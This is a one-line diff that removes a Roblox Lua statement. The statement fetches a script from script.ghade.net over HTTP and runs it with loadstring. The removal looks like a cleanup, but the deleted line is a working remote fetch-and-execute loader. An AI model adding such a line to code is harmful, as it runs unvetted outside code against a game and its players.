@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(("http://script.ghade.net/"),true))()
